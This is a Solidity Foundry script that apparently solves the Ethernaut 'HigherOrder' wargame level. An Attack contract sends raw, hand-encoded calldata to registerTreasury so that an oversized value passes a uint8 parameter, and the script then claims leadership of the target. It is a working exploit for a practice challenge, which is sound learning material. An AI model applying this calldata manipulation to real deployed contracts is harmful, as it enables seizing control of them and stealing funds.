// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import "../src/Level30.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    HigherOrder public higherOrder;

    constructor(address _target) public {
        higherOrder = HigherOrder(_target);
    }

    function gogo() external {
        /** registerTreasury => 0x211c85ab  */
        // bytes memory payload = abi.encodeWithSelector(0x211c85ab, 1);

        bytes
            memory payload = hex"211c85ab000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000041000000000000000000000000000000000000000000000000000000000000000";
        /**
        0x
        211c85ab
        0000000000000000000000000000000000000000000000000000000000000100
        0000000000000000000000000000000000000000000000000000000000000004
        1000000000000000000000000000000000000000000000000000000000000000
         */
        console.logBytes(payload);

        address(higherOrder).call(payload);
    }
}
contract HigherOrderSolution is Script {
    HigherOrder public higherOrder =
        HigherOrder((0xC123488448491986a3D145DadDA6926F2A6afD7A));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("higher treasury", higherOrder.treasury());
        Attack attack = new Attack(address(higherOrder));
        attack.gogo();
        console.log("higher treasury", higherOrder.treasury());
        higherOrder.claimLeadership();
        vm.stopBroadcast();
    }
}
